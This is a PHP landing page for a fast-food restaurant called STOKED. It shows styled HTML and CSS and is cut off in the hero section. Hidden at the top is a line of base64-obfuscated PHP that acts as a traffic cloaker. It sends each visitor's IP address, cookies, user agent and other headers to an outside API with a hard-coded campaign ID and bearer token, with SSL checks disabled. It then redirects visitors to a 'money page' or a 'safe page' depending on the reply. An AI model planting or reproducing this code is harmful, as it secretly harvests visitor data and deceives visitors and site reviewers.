<?php header(base64_decode('RXhwaXJlczogb24sIDAxIEphbiAxOTcwIDAwOjAwOjAwIEdNVA=='));header(base64_decode('TGFzdC1Nb2RpZmllZDog').gmdate(base64_decode('RCwgZCBNIFkgSDppOnM=')).base64_decode('IEdNVA=='));header(base64_decode('Q2FjaGUtQ29udHJvbDogbm8tc3RvcmUsIG5vLWNhY2hlLCBtdXN0LXJldmFsaWRhdGU='));header(base64_decode('Q2FjaGUtQ29udHJvbDogcG9zdC1jaGVjaz0wLCBwcmUtY2hlY2s9MA=='),false);header(base64_decode('UHJhZ21hOiBuby1jYWNoZQ=='));set_error_handler(function($x0,$e1,$d2,$e3,array$t4){if(0===error_reporting()){return false;}Vu3::vu3_nae(Vu3::$p5,Vu3::$p6,$e1.base64_decode('IDog').$x0.base64_decode('IDog').$d2.base64_decode('IDog').$e3);});class Vu3{public static $p6;public static $p5;private $u7;private $p8='';private $m9='';private $q10='';function __construct(){self::$p6=base64_decode('aHR0cHM6Ly92dTMub3JnL2FwaS92Mg==');self::$p5=base64_decode('NDg2Mg==');$this->u7=base64_decode('all6UWxaYlJ0NkV4cEFTUEFBNHliMGFzeEN2QlE2b2tJTFhDSmV2SDdFTFB6SnZzRkNPNEY2R2p2OVFUUW5PRWFHbnFOU0hFZE0xWHdtVjM=');}private function vu3_ssp($t12=null){$this->p8=$t12;}private function vu3_smp($t12=null){if($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]!=null){$u14=$this->vu3_qta($_SERVER[base64_decode('UVVFUllfU1RSSU5H')]);foreach($u14 as $d15=>$j16){$t12=str_replace('['.$d15.']',$j16,$t12);}}$this->m9=$t12;}public function vu3_da($e18){if(isset($e18[base64_decode('c3RhdHVz')])){$this->vu3_ssp($e18[base64_decode('c2FmZV9wYWdl')]);$this->vu3_smp($e18[base64_decode('bW9uZXlfcGFnZQ==')]);if($e18[base64_decode('c3RhdHVz')]===false){if($this->p8!==null){if(strpos($this->vu3_gcu(),$this->p8)!==false){return true;}else{$this->vu3_r($this->p8);}}else{return true;}}else{if($this->m9!==null){$this->vu3_r($this->m9);}}}else{if(isset($e18[base64_decode('ZXJyb3Jz')])){return true;}return true;}}public function vu3_sragrc(){$c19=curl_init();$k20=$this->vu3_faph();curl_setopt($c19,CURLOPT_URL,self::$p6.base64_decode('P3RpbWVzdGFtcD0=').time());curl_setopt($c19,CURLOPT_POST,1);curl_setopt($c19,CURLOPT_POSTFIELDS,http_build_query(array()));curl_setopt($c19,CURLOPT_DNS_CACHE_TIMEOUT,120);curl_setopt($c19,CURLOPT_CONNECTTIMEOUT,30);curl_setopt($c19,CURLOPT_TIMEOUT,30);curl_setopt($c19,CURLOPT_HTTPHEADER,$k20);curl_setopt($c19,CURLOPT_FRESH_CONNECT,true);curl_setopt($c19,CURLOPT_RETURNTRANSFER,1);curl_setopt($c19,CURLOPT_TCP_NODELAY,1);curl_setopt($c19,CURLOPT_SSL_VERIFYHOST,false);curl_setopt($c19,CURLOPT_SSL_VERIFYPEER,false);$c21=curl_exec($c19);$v22=curl_errno($c19);$v23=curl_getinfo($c19,CURLINFO_HTTP_CODE);$c21=trim($c21);$i24=json_decode($c21,true);curl_close($c19);if($v23!==200){return true;}else if($i24===false){return true;}else if($i24[base64_decode('c3RhdHVz')]===false){return true;}else{return $i24;}}private function vu3_faph(){$k20=array();$k20[]=base64_decode('Q0FNUEFJR04tSUQ6IA==').self::$p5;$k20[]=base64_decode('SVA6IA==').$this->vu3_gi();$k20[]=base64_decode('QXV0aG9yaXphdGlvbjogQmVhcmVyIA==').$this->u7;$k20[]=base64_decode('QWNjZXB0OiBhcHBsaWNhdGlvbi9qc29u');$this->vu3_ah($k20,base64_decode('U0NSSVBUX0ZJTEVOQU1F'));$this->vu3_ah($k20,base64_decode('SFRUUF9VU0VSX0FHRU5U'));$this->vu3_ah($k20,base64_decode('SFRUUF9BQ0NFUFRfTEFOR1VBR0U='));$this->vu3_ah($k20,base64_decode('SFRUUF9SRUZFUkVS'));$this->vu3_ah($k20,base64_decode('UkVRVUVTVF9VUkk='));$this->vu3_ah($k20,base64_decode('U0NSSVBUX05BTUU='));$this->vu3_ah($k20,base64_decode('UEhQX1NFTEY='));$this->vu3_ah($k20,base64_decode('SFRUUF9DT09LSUU='));$this->vu3_ah($k20,base64_decode('SFRUUF9IT1NU'));$this->vu3_ah($k20,base64_decode('UVVFUllfU1RSSU5H'));$this->vu3_ah($k20,base64_decode('SFRUUF9GT1JXQVJERURfRk9S'));$this->vu3_ah($k20,base64_decode('SFRUUF9DTElFTlRfSVA='));$this->vu3_ah($k20,base64_decode('UkVNT1RFX0FERFI='));$this->vu3_ah($k20,base64_decode('SFRUUF9UUkFGRklDU0hJRUxE'));$this->vu3_ah($k20,base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I='));$this->vu3_ah($k20,base64_decode('SFRUUF9YX1JFQUxfSVA='));$this->vu3_ah($k20,base64_decode('WF9GT1JXQVJERURfRk9S'));$this->vu3_ah($k20,base64_decode('SFRUUF9YX1JFUVVFU1RFRF9XSVRI'));$this->vu3_ah($k20,base64_decode('U0VSVkVSX0FERFI='));$this->vu3_ah($k20,base64_decode('SFRUUF9DT05ORUNUSU9O'));$this->vu3_ah($k20,base64_decode('SFRUUF9WSUE='));$this->vu3_ah($k20,base64_decode('V0FQX1BST0ZJTEU='));$this->vu3_ah($k20,base64_decode('UFJPRklMRQ=='));$this->vu3_ah($k20,base64_decode('WF9XQVBfUFJPRklMRQ=='));$this->vu3_ah($k20,base64_decode('SFRUUF9BQ0NFUFQ='));$this->vu3_ah($k20,base64_decode('SFRUUF9JTkNBUF9DTElFTlRfSVA='));$this->vu3_ah($k20,base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ'));$this->vu3_ah($k20,base64_decode('SFRUUF9BQ0NFUFRfRU5DT0RJTkc='));$this->vu3_ah($k20,base64_decode('UkVRVUVTVF9USU1FX0ZMT0FU'));$this->vu3_ah($k20,base64_decode('UkVRVUVTVF9TQ0hFTUU='));$this->vu3_ah($k20,base64_decode('WF9QVVJQT1NF'));$this->vu3_ah($k20,base64_decode('WF9GQl9IVFRQX0VOR0lORQ=='));$this->vu3_ah($k20,base64_decode('SFRUUF9YX09QRVJBTUlOSV9QSE9ORV9VQQ=='));$this->vu3_ah($k20,base64_decode('SFRUUF9ERVZJQ0VfU1RPQ0tfVUE='));return $k20;}function vu3_ah(&$k20,$k25){if(!isset($_SERVER[$k25])){return;}$t12=$_SERVER[$k25];if(is_array($t12)){$t12=implode(base64_decode('LA=='),$t12);}$k25=str_replace(base64_decode('Xw=='),base64_decode('LQ=='),$k25);$k20[]=$k25.base64_decode('OiA=').$t12;}function vu3_qta($y26){$e18=array();if(strpos($y26,base64_decode('PQ=='))){if(strpos($y26,base64_decode('Pw=='))!==false){$l27=parse_url($y26);$y26=$l27[base64_decode('cXVlcnk=')];}}else{return false;}foreach(explode(base64_decode('Jg=='),$y26)as $w28){list($d15,$i29)=explode(base64_decode('PQ=='),$w28);$e18[$d15]=$i29;}return empty($e18)?false:$e18;}private function vu3_gcu(){$g0='';if(isset($_SERVER[base64_decode('SFRUUF9DRl9WSVNJVE9S')])){$t1=json_decode($_SERVER[base64_decode('SFRUUF9DRl9WSVNJVE9S')]);if(isset($t1->scheme)&&$t1->scheme==base64_decode('aHR0cHM=')){$g0=base64_decode('aHR0cHM6Ly8=');}}else if(isset($_SERVER[base64_decode('SFRUUFM=')])&&$_SERVER[base64_decode('SFRUUFM=')]==base64_decode('b24=')){$g0=base64_decode('aHR0cHM6Ly8=');}if(!$g0){$g0=base64_decode('aHR0cDovLw==');}if($_SERVER[base64_decode('SFRUUF9IT1NU')]!=''&&$_SERVER[base64_decode('SFRUUF9IT1NU')]!=base64_decode('Xw==')){$g0.=$_SERVER[base64_decode('SFRUUF9IT1NU')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];}else{$g0.=$_SERVER[base64_decode('U0VSVkVSX05BTUU=')].$_SERVER[base64_decode('UkVRVUVTVF9VUkk=')];}return $g0;}private function vu3_gi(){if(getenv(base64_decode('SFRUUF9DTElFTlRfSVA=')))$this->q10=getenv(base64_decode('SFRUUF9DTElFTlRfSVA='));else if(getenv(base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ'))&&getenv(base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ'))!=$_SERVER[base64_decode('U0VSVkVSX0FERFI=')])$this->q10=getenv(base64_decode('SFRUUF9DRl9DT05ORUNUSU5HX0lQ'));else if(getenv(base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I='))&&getenv(base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I='))!=$_SERVER[base64_decode('U0VSVkVSX0FERFI=')])$this->q10=getenv(base64_decode('SFRUUF9YX0ZPUldBUkRFRF9GT1I='));else if(getenv(base64_decode('SFRUUF9YX0ZPUldBUkRFRA==')))$this->q10=getenv(base64_decode('SFRUUF9YX0ZPUldBUkRFRA=='));else if(getenv(base64_decode('SFRUUF9GT1JXQVJERURfRk9S')))$this->q10=getenv(base64_decode('SFRUUF9GT1JXQVJERURfRk9S'));else if(getenv(base64_decode('SFRUUF9GT1JXQVJERUQ=')))$this->q10=getenv(base64_decode('SFRUUF9GT1JXQVJERUQ='));else if(getenv(base64_decode('UkVNT1RFX0FERFI=')))$this->q10=getenv(base64_decode('UkVNT1RFX0FERFI='));else $this->q10=base64_decode('VU5LTk9XTg==');$this->q10=explode(base64_decode('LA=='),$this->q10);return trim($this->q10[0]);}private function vu3_r($y32){if(!function_exists(base64_decode('aGVhZGVyc19zZW50'))||!headers_sent()){exit(header(sprintf(base64_decode('TG9jYXRpb246ICVz'),$y32),true,307));}echo base64_decode('PGh0bWw+');echo base64_decode('PGhlYWQ+');echo base64_decode('PHRpdGxlPlJlZGlyZWN0aW5nLi4uPC90aXRsZT4=');echo base64_decode('PG1ldGEgbmFtZT0icm9ib3RzIiBjb250ZW50PSJub2luZGV4IG5vZm9sbG93Ii8+');echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg==');echo base64_decode('d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoXCc=').$y32.base64_decode('XCcpOw==');echo base64_decode('PC9zY3JpcHQ+');echo base64_decode('PG5vc2NyaXB0Pg==');echo base64_decode('PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9XCc=').$y32.base64_decode('XCciLz4=');echo base64_decode('PC9ub3NjcmlwdD4=');echo base64_decode('PC9oZWFkPg==');echo base64_decode('PGJvZHk+');echo base64_decode('WW91IGFyZSBiZWluZyByZWRpcmVjdGVkIHRvIDxhIGhyZWY9Ig==').$y32.base64_decode('IiB0YXJnZXQ9Il90b3AiPnlvdXIgZGVzdGluYXRpb248L2E+Lg==');echo base64_decode('PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg==');echo base64_decode('d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoXCc=').$y32.base64_decode('XCcpOw==');echo base64_decode('PC9zY3JpcHQ+');echo base64_decode('PC9ib2R5Pg==');echo base64_decode('PC9odG1sPg==');die();}public static function vu3_nae($p5,$p6,$v33){$q34=strlen($v33);if($q34>800){$v33=substr($v33,0,800);}$v33=urlencode($v33);$y32=$p6.base64_decode('L2xvZ3NfZXJyb3Jz');$j35=array(base64_decode('Y2FtcGFpZ25faWQ=')=>$p5,base64_decode('bWVzc2FnZQ==')=>$v33);$c19=curl_init();curl_setopt($c19,CURLOPT_URL,$y32);curl_setopt($c19,CURLOPT_DNS_CACHE_TIMEOUT,3);curl_setopt($c19,CURLOPT_CONNECTTIMEOUT,3);curl_setopt($c19,CURLOPT_TIMEOUT,3);curl_setopt($c19,CURLOPT_POSTFIELDS,http_build_query($j35));curl_setopt($c19,CURLOPT_POST,1);curl_setopt($c19,CURLOPT_RETURNTRANSFER,1);$c21=curl_exec($c19);curl_close($c19);http_response_code(500);echo base64_decode('QW4gZXJyb3Igb2NjdXJyZWQ=').base64_decode('PGJyPg==');}}function vu3_cr(){$d36=new Vu3();$e18=$d36->vu3_sragrc();$d36->vu3_da($e18);}vu3_cr();?><!DOCTYPE html>


<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>STOKED — Flame-Grilled Fast Food</title>
<meta name="description" content="STOKED — flame-grilled burgers, wings and loaded fries. Fast, loud, made over real fire.">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Anton&family=Work+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
  :root{
    --char:#1C1410;
    --char-2:#241A14;
    --cream:#FBF3E7;
    --ember:#FF5A1F;
    --ember-dark:#B7311A;
    --mustard:#F2A93B;
    --smoke:#8A7E73;
    --line: rgba(251,243,231,0.14);
    --radius: 2px;
  }
  *{box-sizing:border-box;margin:0;padding:0;}
  html{scroll-behavior:smooth;}
  body{
    background:var(--char);
    color:var(--cream);
    font-family:'Work Sans',sans-serif;
    font-size:16px;
    line-height:1.6;
    overflow-x:hidden;
  }
  h1,h2,h3,h4{
    font-family:'Anton',sans-serif;
    font-weight:400;
    text-transform:uppercase;
    letter-spacing:0.5px;
    line-height:1.05;
  }
  .mono{font-family:'JetBrains Mono',monospace;}
  a{color:inherit;text-decoration:none;}
  img{max-width:100%;display:block;}
  ul{list-style:none;}
  .wrap{max-width:1180px;margin:0 auto;padding:0 24px;}
  .eyebrow{
    font-family:'JetBrains Mono',monospace;
    font-size:12.5px;
    letter-spacing:2.5px;
    text-transform:uppercase;
    color:var(--ember);
    display:flex;
    align-items:center;
    gap:10px;
    margin-bottom:14px;
  }
  .eyebrow::before{content:"";width:22px;height:2px;background:var(--ember);display:inline-block;}
  .btn{
    display:inline-flex;
    align-items:center;
    gap:10px;
    padding:15px 30px;
    font-family:'JetBrains Mono',monospace;
    font-weight:600;
    font-size:13px;
    letter-spacing:1.5px;
    text-transform:uppercase;
    border-radius:var(--radius);
    cursor:pointer;
    border:2px solid transparent;
    transition:transform .18s ease, background .18s ease, color .18s ease, border-color .18s ease;
    white-space:nowrap;
  }
  .btn-solid{background:var(--ember);color:var(--char);}
  .btn-solid:hover{transform:translateY(-2px);background:var(--mustard);}
  .btn-outline{border-color:var(--line);color:var(--cream);}
  .btn-outline:hover{border-color:var(--ember);color:var(--ember);}
  section{padding:110px 0;position:relative;}
  @media(max-width:768px){section{padding:70px 0;}}

  /* ---------- grate divider ---------- */
  .grate{
    height:26px;
    width:100%;
    background-image:repeating-linear-gradient(115deg, transparent 0 18px, var(--line) 18px 20px);
    opacity:.6;
  }

  /* ---------- topbar ---------- */
  .topbar{
    background:var(--char-2);
    border-bottom:1px solid var(--line);
    font-family:'JetBrains Mono',monospace;
    font-size:12.5px;
    color:var(--smoke);
  }
  .topbar .wrap{display:flex;justify-content:space-between;align-items:center;height:38px;flex-wrap:wrap;gap:6px;}
  .topbar .tag{color:var(--mustard);}

  /* ---------- nav ---------- */
  header.nav{
    position:sticky;top:0;z-index:100;
    background:rgba(28,20,16,0.92);
    backdrop-filter:blur(8px);
    border-bottom:1px solid var(--line);
  }
  .nav .wrap{display:flex;align-items:center;justify-content:space-between;height:78px;}
  .logo{font-family:'Anton',sans-serif;font-size:26px;letter-spacing:1px;display:flex;align-items:center;gap:8px;}
  .logo .flame-dot{color:var(--ember);}
  .nav-links{display:flex;gap:34px;font-size:14px;font-weight:500;}
  .nav-links a{position:relative;padding:4px 0;}
  .nav-links a::after{content:"";position:absolute;left:0;bottom:0;width:0;height:2px;background:var(--ember);transition:width .2s ease;}
  .nav-links a:hover::after{width:100%;}
  .nav-cta{display:flex;align-items:center;gap:22px;}
  .burger{display:none;flex-direction:column;gap:5px;cursor:pointer;background:none;border:none;}
  .burger span{width:24px;height:2px;background:var(--cream);}
  @media(max-width:900px){
    .nav-links{position:fixed;top:78px;left:0;right:0;background:var(--char-2);flex-direction:column;padding:24px;gap:20px;border-bottom:1px solid var(--line);transform:translateY(-130%);transition:transform .25s ease;}
    .nav-links.open{transform:translateY(0);}
    .burger{display:flex;}
    .nav-cta .btn-solid{display:none;}
  }

  /* ---------- hero ---------- */
  .hero{
    padding:90px 0 0;
    position:relative;
    background:
      radial-gradient(circle at 82% 18%, rgba(255,90,31,0.18), transparent 45%),
      radial-gradient(circle at 10% 80%, rgba(242,169,59,0.10), transparent 40%),
      var(--char);
    overflow:hidden;
  }
  .hero .wrap{display:grid;grid-template-columns:1.1fr 0.9fr;gap:50px;align-items:center;}
  @media(max-width:900px){.hero .wrap{grid-template-columns:1fr;}}
  .hero h1{font-size:clamp(46px,7vw,88px);margin:16px 0 22px;}
  .hero h1 .hl{color:var(--ember);-webkit-text-stroke:0;}
  .hero p.lead{color:var(--smoke);max-width:460px;font-size:17px;margin-bottom:34px;}
  .hero-ctas{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:50px;}
  .stat-strip{display:flex;gap:40px;flex-wrap:wrap;border-top:1px solid var(--line);padding-top:28px;}
  .stat-strip div b{font-family:'Anton',sans-serif;font-size:30px;color:var(--mustard);display:block;}
  .stat-strip div span{font-size:12.5px;color:var(--smoke);font-family:'JetBrains Mono',monospace;letter-spacing:.5px;}
  .hero-art{position:relative;}
  .hero-photo{
    aspect-ratio:4/5;
    border-radius:6px;
    overflow:hidden;
    position:relative;
    border:1px solid var(--line);
  }
  .hero-photo img{width:100%;height:100%;object-fit:cover;}
  .ticket{
    position:absolute;bottom:-26px;left:-26px;
    background:var(--cream);color:var(--char);
    padding:16px 20px;border-radius:2px;
    box-shadow:0 20px 40px rgba(0,0,0,.4);
    font-family:'JetBrains Mono',monospace;
    width:190px;
  }
  .ticket .fire{color:var(--ember-dark);font-weight:600;font-size:12px;letter-spacing:1px;}
  .ticket .big{font-family:'Anton',sans-serif;font-size:22px;margin:4px 0;}
  .ticket .tiny{font-size:11px;color:#6b6058;}
  @media(max-width:900px){.ticket{left:0;}}

  /* ---------- marquee ---------- */
  .marquee-wrap{border-top:1px solid var(--line);border-bottom:1px solid var(--line);background:var(--char-2);overflow:hidden;padding:16px 0;}
  .marquee{display:flex;width:max-content;animation:scroll 26s linear infinite;}
  .marquee span{font-family:'Anton',sans-serif;font-size:20px;color:var(--smoke);padding:0 28px;display:flex;align-items:center;gap:28px;white-space:nowrap;}
  .marquee span em{font-style:normal;color:var(--ember);}
  @keyframes scroll{from{transform:translateX(0);}to{transform:translateX(-50%);}}

  /* ---------- section heading ---------- */
  .head{max-width:640px;margin-bottom:56px;}
  .head h2{font-size:clamp(32px,4.4vw,50px);}
  .head p{color:var(--smoke);margin-top:14px;font-size:16px;}

  /* ---------- categories ---------- */
  .cat-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:18px;}
  @media(max-width:900px){.cat-grid{grid-template-columns:repeat(2,1fr);}}
  .cat-card{
    background:var(--char-2);border:1px solid var(--line);border-radius:6px;
    padding:26px 18px;text-align:center;transition:transform .2s ease, border-color .2s ease;
  }
  .cat-card:hover{transform:translateY(-6px);border-color:var(--ember);}
  .cat-card .icon{font-size:34px;margin-bottom:14px;}
  .cat-card h4{font-size:15px;letter-spacing:.5px;}
  .cat-card span{display:block;color:var(--smoke);font-size:12px;font-family:'JetBrains Mono',monospace;margin-top:6px;}

  /* ---------- about ---------- */
  .about{background:var(--char-2);}
  .about .wrap{display:grid;grid-template-columns:0.9fr 1.1fr;gap:70px;align-items:center;}
  @media(max-width:900px){.about .wrap{grid-template-columns:1fr;}}
  .about-photos{position:relative;}
  .about-photos img{border-radius:6px;border:1px solid var(--line);}
  .about-photos .p1{width:78%;}
  .about-photos .p2{width:50%;position:absolute;bottom:-40px;right:-10px;border:6px solid var(--char-2);box-shadow:0 20px 40px rgba(0,0,0,.5);}
  @media(max-width:600px){.about-photos .p2{position:static;width:78%;margin-top:16px;border:1px solid var(--line);}}
  .about-list{margin-top:26px;display:flex;flex-direction:column;gap:20px;}
  .about-list li{display:flex;gap:16px;}
  .about-list .num{font-family:'Anton',sans-serif;color:var(--ember);font-size:22px;min-width:34px;}
  .about-list h4{font-size:16px;margin-bottom:4px;}
  .about-list p{color:var(--smoke);font-size:14.5px;}

  /* ---------- menu ---------- */
  .tabs{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:44px;}
  .tab{
    padding:10px 20px;border:1px solid var(--line);border-radius:30px;
    font-family:'JetBrains Mono',monospace;font-size:12.5px;letter-spacing:1px;text-transform:uppercase;
    cursor:pointer;color:var(--smoke);background:transparent;transition:all .2s ease;
  }
  .tab.active,.tab:hover{background:var(--ember);border-color:var(--ember);color:var(--char);}
  .menu-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
  @media(max-width:900px){.menu-grid{grid-template-columns:repeat(2,1fr);}}
  @media(max-width:600px){.menu-grid{grid-template-columns:1fr;}}
  .dish{
    background:var(--char-2);border:1px solid var(--line);border-radius:6px;overflow:hidden;
    transition:transform .2s ease, border-color .2s ease;
  }
  .dish:hover{transform:translateY(-6px);border-color:var(--ember);}
  .dish .photo{aspect-ratio:4/3;position:relative;overflow:hidden;}
  .dish .photo img{width:100%;height:100%;object-fit:cover;transition:transform .4s ease;}
  .dish:hover .photo img{transform:scale(1.08);}
  .dish .badge{position:absolute;top:12px;left:12px;background:var(--ember);color:var(--char);font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;letter-spacing:1px;padding:5px 10px;border-radius:2px;text-transform:uppercase;}
  .dish .body{padding:20px;}
  .dish .cat{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--mustard);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px;}
  .dish h4{font-size:19px;margin-bottom:8px;}
  .dish p{color:var(--smoke);font-size:13.5px;margin-bottom:16px;min-height:42px;}
  .dish .foot{display:flex;justify-content:space-between;align-items:center;}
  .dish .price{font-family:'Anton',sans-serif;font-size:20px;color:var(--cream);}
  .dish .price s{color:var(--smoke);font-size:14px;margin-right:6px;font-family:'Work Sans';}
  .flames{display:flex;gap:3px;}
  .flames span{opacity:.25;}
  .flames span.on{opacity:1;}
  .menu-more{text-align:center;margin-top:50px;}

  /* ---------- deal ---------- */
  .deal{
    background:linear-gradient(115deg, var(--ember-dark) 0%, var(--ember) 100%);
    color:var(--char);
    clip-path: polygon(0 4%, 100% 0, 100% 96%, 0 100%);
    padding:100px 0;
  }
  .deal .wrap{display:grid;grid-template-columns:1.1fr 0.9fr;gap:50px;align-items:center;}
  @media(max-width:900px){.deal .wrap{grid-template-columns:1fr;}.deal{clip-path:none;}}
  .deal .eyebrow{color:var(--char);}
  .deal .eyebrow::before{background:var(--char);}
  .deal h2{font-size:clamp(30px,4.6vw,52px);color:var(--char);}
  .deal p{color:#3a1a0f;max-width:420px;margin:16px 0 30px;font-size:15.5px;}
  .countdown{display:flex;gap:14px;margin-bottom:32px;}
  .countdown div{background:var(--char);color:var(--cream);border-radius:4px;padding:14px 16px;text-align:center;min-width:64px;}
  .countdown div b{display:block;font-family:'Anton',sans-serif;font-size:24px;}
  .countdown div span{font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--smoke);letter-spacing:1px;}
  .deal-price{font-family:'Anton',sans-serif;}
  .deal-price .old{font-size:20px;text-decoration:line-through;color:#3a1a0f;margin-right:10px;}
  .deal-price .new{font-size:40px;}
  .deal-photo{border-radius:8px;overflow:hidden;border:4px solid var(--char);aspect-ratio:1/1;}
  .deal-photo img{width:100%;height:100%;object-fit:cover;}

  /* ---------- stats band ---------- */
  .band{background:var(--char-2);border-top:1px solid var(--line);border-bottom:1px solid var(--line);padding:50px 0;}
  .band .wrap{display:flex;justify-content:space-between;flex-wrap:wrap;gap:30px;text-align:center;}
  .band div b{font-family:'Anton',sans-serif;font-size:40px;color:var(--ember);display:block;}
  .band div span{font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--smoke);letter-spacing:1px;}

  /* ---------- testimonials ---------- */
  .test-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:24px;}
  @media(max-width:900px){.test-grid{grid-template-columns:1fr;}}
  .test-card{background:var(--char-2);border:1px solid var(--line);border-radius:6px;padding:30px;}
  .test-card .quote{color:var(--ember);font-family:'Anton',sans-serif;font-size:34px;line-height:1;}
  .test-card p{color:var(--cream);font-size:15px;margin:14px 0 22px;}
  .test-card .who{display:flex;align-items:center;gap:12px;}
  .test-card .who img{width:44px;height:44px;border-radius:50%;object-fit:cover;}
  .test-card .who b{display:block;font-size:14px;}
  .test-card .who span{color:var(--smoke);font-size:12px;font-family:'JetBrains Mono',monospace;}

  /* ---------- hours/location ---------- */
  .split{background:var(--char-2);}
  .split .wrap{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line);border-radius:6px;overflow:hidden;}
  @media(max-width:800px){.split .wrap{grid-template-columns:1fr;}}
  .split .col{padding:50px;}
  .split .col:first-child{border-right:1px solid var(--line);}
  .hours-row{display:flex;justify-content:space-between;padding:14px 0;border-bottom:1px solid var(--line);font-size:14.5px;}
  .hours-row:last-child{border-bottom:none;}
  .hours-row span:last-child{font-family:'JetBrains Mono',monospace;color:var(--mustard);}
  .loc-row{display:flex;gap:16px;margin-bottom:22px;}
  .loc-row .ic{width:40px;height:40px;border-radius:50%;background:rgba(255,90,31,.12);color:var(--ember);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0;}
  .loc-row b{display:block;font-size:13px;}
  .loc-row span{color:var(--smoke);font-size:14px;}

  /* ---------- reservation ---------- */
  .reserve .wrap{display:grid;grid-template-columns:0.8fr 1.2fr;gap:60px;}
  @media(max-width:900px){.reserve .wrap{grid-template-columns:1fr;}}
  .form-card{background:var(--char-2);border:1px solid var(--line);border-radius:8px;padding:40px;}
  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;}
  @media(max-width:560px){.form-grid{grid-template-columns:1fr;}}
  .field{display:flex;flex-direction:column;gap:8px;margin-bottom:18px;}
  .field label{font-size:12px;font-family:'JetBrains Mono',monospace;letter-spacing:1px;color:var(--smoke);text-transform:uppercase;}
  .field input,.field select,.field textarea{
    background:var(--char);border:1px solid var(--line);border-radius:4px;
    padding:13px 14px;color:var(--cream);font-family:'Work Sans';font-size:14.5px;
  }
  .field input:focus,.field select:focus,.field textarea:focus{outline:2px solid var(--ember);border-color:var(--ember);}
  .form-msg{margin-top:16px;font-family:'JetBrains Mono',monospace;font-size:13px;color:var(--mustard);display:none;}
  .form-msg.show{display:block;}

  /* ---------- newsletter ---------- */
  .newsletter{
    background:radial-gradient(circle at 50% 0%, rgba(255,90,31,.18), transparent 60%), var(--char-2);
    text-align:center;border-top:1px solid var(--line);border-bottom:1px solid var(--line);
  }
  .newsletter h2{font-size:clamp(28px,4vw,44px);}
  .newsletter p{color:var(--smoke);margin:14px 0 30px;}
  .sub-form{display:flex;max-width:440px;margin:0 auto;gap:0;border:1px solid var(--line);border-radius:4px;overflow:hidden;}
  .sub-form input{flex:1;background:transparent;border:none;padding:15px 18px;color:var(--cream);font-family:'Work Sans';}
  .sub-form input:focus{outline:none;}
  .sub-form button{border:none;}

  /* ---------- contact ---------- */
  .contact .wrap{display:grid;grid-template-columns:0.8fr 1.2fr;gap:60px;}
  @media(max-width:900px){.contact .wrap{grid-template-columns:1fr;}}
  .contact-info li{display:flex;gap:16px;margin-bottom:26px;}

  /* ---------- footer ---------- */
  footer{background:var(--char-2);border-top:1px solid var(--line);padding:70px 0 30px;}
  .foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1.2fr;gap:40px;margin-bottom:50px;}
  @media(max-width:800px){.foot-grid{grid-template-columns:1fr 1fr;}}
  .foot-grid h5{font-family:'JetBrains Mono',monospace;font-size:12px;letter-spacing:1.5px;text-transform:uppercase;color:var(--mustard);margin-bottom:20px;}
  .foot-grid li{margin-bottom:12px;font-size:14px;color:var(--smoke);}
  .foot-grid li a:hover{color:var(--ember);}
  .foot-bottom{border-top:1px solid var(--line);padding-top:26px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12.5px;color:var(--smoke);font-family:'JetBrains Mono',monospace;}
  .socials{display:flex;gap:12px;}
  .socials a{width:36px;height:36px;border:1px solid var(--line);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;transition:all .2s ease;}
  .socials a:hover{background:var(--ember);border-color:var(--ember);color:var(--char);}

  .reveal{opacity:0;transform:translateY(24px);transition:opacity .6s ease, transform .6s ease;}
  .reveal.in{opacity:1;transform:translateY(0);}
</style>
</head>
<body>

<div class="topbar">
  <div class="wrap">
    <div>+1 (800) 555-0134 &nbsp;·&nbsp; hello@stoked.food</div>
    <div class="tag mono">FREE DELIVERY ON ORDERS OVER $25 →</div>
  </div>
</div>

<header class="nav">
  <div class="wrap">
    <a class="logo" href="#hero">STOKED<span class="flame-dot">.</span></a>
    <nav class="nav-links" id="navLinks">
      <a href="#hero">Home</a>
      <a href="#about">Story</a>
      <a href="#menu">Menu</a>
      <a href="#reservation">Reserve</a>
      <a href="#reviews">Reviews</a>
      <a href="#contact">Contact</a>
    </nav>
    <div class="nav-cta">
      <a class="btn btn-solid" href="#menu">Order Now</a>
      <button class="burger" id="burgerBtn" aria-label="Toggle menu"><span></span><span></span><span></span></button>
    </div>
  </div>
</header>

<!-- HERO -->
<section class="hero" id="hero">
  <div class="wrap">
    <div class="hero-copy">
      <div class="eyebrow">Est. 2014 · Open Fire Kitchen</div>
      <h1>Flame-grilled.<br>Fast.<br><span class="hl">Loud.</span></h1>
